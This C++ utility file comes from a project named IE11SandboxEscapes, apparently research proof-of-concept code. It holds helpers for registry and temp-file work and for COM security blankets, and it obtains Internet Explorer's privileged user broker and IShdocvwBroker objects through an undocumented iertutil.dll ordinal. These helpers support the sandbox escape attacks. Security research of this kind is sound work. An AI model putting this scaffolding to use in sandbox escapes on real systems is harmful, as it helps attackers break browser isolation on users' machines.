// This file is part of IE11SandboxEsacapes.

// IE11SandboxEscapes is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.

// IE11SandboxEscapes is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with IE11SandboxEscapes.  If not, see <http://www.gnu.org/licenses/>.

#include "stdafx.h"

#include "Utils.h"

#include <strsafe.h>
#include <sddl.h>
#include <Shlwapi.h>

#pragma comment(lib, "shlwapi.lib")

static BOOL g_hasShDocIID;
static IID g_shDocIID;

BOOL GetIIDForName(LPCWSTR lpName, IID* riid)
{
	HKEY hRoot = nullptr;
	ULONG status;

	status = RegOpenKeyEx(HKEY_CLASSES_ROOT, L"Interface", 0, KEY_ENUMERATE_SUB_KEYS, &hRoot);
	if (status == 0)
	{
		WCHAR keyName[128];
		DWORD index = 0;
		BOOL foundKey = FALSE;

		while (true)
		{
			HKEY hSubKey;

			status = RegEnumKeyW(hRoot, index, keyName, _countof(keyName));
			if (status != 0)
			{
				break;
			}

			index++;

			status = RegOpenKeyEx(hRoot, keyName, 0, KEY_QUERY_VALUE, &hSubKey);
			if (status != 0)
			{
				continue;
			}

			DWORD dwType;
			WCHAR valueName[256];
			DWORD dwSize = sizeof(valueName)-sizeof(WCHAR);

			status = RegQueryValueEx(hSubKey, nullptr, nullptr, &dwType, (BYTE*)valueName, &dwSize);
			RegCloseKey(hSubKey);

			if ((status != 0) || (dwType != REG_SZ))
			{
				continue;
			}

			// Ensure NUL terminate
			valueName[dwSize / sizeof(WCHAR)] = 0;

			if (_wcsicmp(valueName, lpName) == 0)
			{
				foundKey = TRUE;
				break;
			}
		}

		RegCloseKey(hRoot);

		if (foundKey)
		{
			return SUCCEEDED(IIDFromString(keyName, riid));
		}
	}
	else
	{
		DebugPrintf("Could not open Interface key %d\n", status);
	}

	return FALSE;
}

REFIID GetSHDocIID()
{
	if (!g_hasShDocIID)
	{
		memset(&g_shDocIID, 0, sizeof(g_shDocIID));

		g_hasShDocIID;

		GetIIDForName(L"ISHDocVwBroker", &g_shDocIID);
	}

	return g_shDocIID;
}

bstr_t GetTemp(LPCWSTR name)
{
	WCHAR tempPath[MAX_PATH];

	GetTempPath(MAX_PATH, tempPath);

	PathAppend(tempPath, name);

	return tempPath;
}

bstr_t GetTempPath()
{
	WCHAR tempPath[MAX_PATH];

	GetTempPath(MAX_PATH, tempPath);

	return tempPath;
}

bstr_t WriteTempFile(LPCWSTR name, unsigned char* buf, size_t len)
{
	WCHAR tempPath[MAX_PATH];

	GetTempPath(MAX_PATH, tempPath);

	PathAppend(tempPath, name);

	FILE* fp = nullptr;

	if (_wfopen_s(&fp, tempPath, L"wb") == 0)
	{
		fwrite(buf, 1, len, fp);

		fclose(fp);

		return tempPath;
	}
	else
	{
		return L"";
	}
}

std::vector<unsigned char> ReadFileToMem(LPCWSTR name)
{
	FILE* fp;
	std::vector<unsigned char> ret;

	if (_wfopen_s(&fp, name, L"rb") == 0)
	{
		fseek(fp, 0, SEEK_END);

		ret.resize(ftell(fp));
		fseek(fp, 0, SEEK_SET);

		fread(&ret[0], 1, ret.size(), fp);

		fclose(fp);
	}

	return ret;
}

void DebugPrintf(LPCSTR lpFormat, ...)
{
	CHAR buf[1024];
	va_list va;

	va_start(va, lpFormat);

	StringCbVPrintfA(buf, sizeof(buf), lpFormat, va);

	OutputDebugStringA(buf);
}

bstr_t GetUserSid()
{
	HANDLE hToken = nullptr;
	PTOKEN_USER pUser = nullptr;
	LPWSTR userName = nullptr;
	bstr_t ret;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{
		DebugPrintf("Error opening process token: %d", GetLastError());
		goto error;
	}

	//TOKEN_USER user = { 0 };
	DWORD retLength = 0;

	if (!GetTokenInformation(hToken, TokenUser, nullptr, 0, &retLength))
	{
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
		{
			DebugPrintf("Error getting token information size: %d", GetLastError());
			goto error;
		}
	}

	pUser = (PTOKEN_USER) new char[retLength];

	if (!GetTokenInformation(hToken, TokenUser, pUser, retLength, &retLength))
	{
		DebugPrintf("Error getting token information: %d", GetLastError());
		goto error;
	}

	if (!ConvertSidToStringSidW(pUser->User.Sid, &userName))
	{
		DebugPrintf("Error converting Sid to String: %d", GetLastError());
		goto error;
	}

	ret = userName;

error:

	if (hToken)
	{
		CloseHandle(hToken);
	}

	if (pUser)
	{
		delete[] pUser;
	}

	if (userName)
	{
		LocalFree(userName);
	}

	return ret;
}

typedef HRESULT(__stdcall *fCoCreateUserBroker)(IIEUserBroker** ppBroker);

GUID CLSID_CShdocvwBroker = { 0x9C7A1728,
0x0B694, 0x427A, { 0x94, 0xA2, 0xA1, 0xB2, 0xC6, 0x0F, 0x03, 0x60 } };

void DisableImpersonation(IUnknown* pUnk)
{
	IClientSecurity* sec = nullptr;

	HRESULT hr = pUnk->QueryInterface(IID_PPV_ARGS(&sec));
	if (SUCCEEDED(hr))
	{
		hr = sec->SetBlanket(pUnk, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, nullptr, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_ANONYMOUS, nullptr, EOAC_NONE);
		DebugPrintf("SetBlanket: %08X", hr);
		sec->Release();
	}
	else
	{
		DebugPrintf("Error getting client security: %08X", hr);
	}
}

void SetCloaking(IUnknown* pUnk)
{
	IClientSecurity* sec = nullptr;

	HRESULT hr = pUnk->QueryInterface(IID_PPV_ARGS(&sec));
	if (SUCCEEDED(hr))
	{
		hr = sec->SetBlanket(pUnk, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, nullptr, RPC_C_AUTHN_LEVEL_DEFAULT,
			RPC_C_IMP_LEVEL_IDENTIFY, nullptr, EOAC_DYNAMIC_CLOAKING);
		DebugPrintf("SetBlanket: %08X", hr);
		sec->Release();
	}
	else
	{
		DebugPrintf("Error getting client security: %08X", hr);
	}
}

IIEUserBrokerPtr CreateBroker()
{
	HMODULE hMod = LoadLibrary(L"iertutil.dll");

	fCoCreateUserBroker pfCoCreateUserBroker = (fCoCreateUserBroker)GetProcAddress(hMod, (LPCSTR)58);

	if (pfCoCreateUserBroker)
	{
		IIEUserBrokerPtr broker;

		HRESULT ret = pfCoCreateUserBroker(&broker);

		DebugPrintf("CreateBroker: %08X - %p", ret, broker);

		return broker;
	}

	return nullptr;
}

IShdocvwBroker* CreateSHDocVw()
{
	IIEUserBrokerPtr broker = CreateBroker();

	if (broker != nullptr)
	{
		HRESULT ret;
		IShdocvwBroker* shdocvw;
		ret = broker->BrokerCreateKnownObject(CLSID_CShdocvwBroker, GetSHDocIID(), (IUnknown**)&shdocvw);
		DebugPrintf("IShdocvwBroker: %08X %p", ret, shdocvw);

		if (SUCCEEDED(ret))
		{
			return shdocvw;
		}
	}

	return nullptr;
}

bstr_t GetWindowsSystemDirectory()
{
	WCHAR buf[MAX_PATH];

	GetSystemDirectory(buf, MAX_PATH);

	return buf;
}

bstr_t GetExecutableFileName(HMODULE hModule)
{
	WCHAR buf[MAX_PATH];

	::GetModuleFileNameW(hModule, buf, MAX_PATH);

	return buf;
}

bstr_t GetSessionPath()
{
	std::wstringstream ss;

	WCHAR objPath[MAX_PATH + 1] = { 0 };
	ULONG length = MAX_PATH;
	DWORD dwSessionId;

	if (ProcessIdToSessionId(GetCurrentProcessId(), &dwSessionId))
	{
		ss << L"\\Sessions\\" << dwSessionId;

		return ss.str().c_str();
	}

	return L"";
}

LSTATUS CreateRegistryValueString(HKEY hKey, LPCWSTR lpName, LPCWSTR lpString)
{
	return RegSetValueEx(hKey, lpName, 0, REG_SZ, (const BYTE*)lpString, (wcslen(lpString) + 1) * sizeof(WCHAR));
}

LSTATUS CreateRegistryValueDword(HKEY hKey, LPCWSTR lpName, DWORD d)
{
	return RegSetValueEx(hKey, lpName, 0, REG_DWORD, (const BYTE*)&d, sizeof(d));
}